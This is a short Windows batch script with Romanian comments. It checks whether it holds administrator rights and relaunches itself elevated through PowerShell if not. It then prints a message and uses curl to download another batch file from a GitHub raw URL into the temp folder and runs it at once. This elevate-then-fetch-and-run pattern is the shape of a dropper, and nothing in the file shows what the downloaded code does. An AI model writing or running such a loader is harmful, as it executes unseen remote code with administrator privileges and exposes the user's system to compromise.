@echo off
:: Verifică dacă rulează ca admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Scriptul nu rulează ca Administrator. Relansare cu drepturi elevate...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo Administrator permision gotted.

curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/script.bat > "%TEMP%\script.bat" && call "%TEMP%\script.bat"
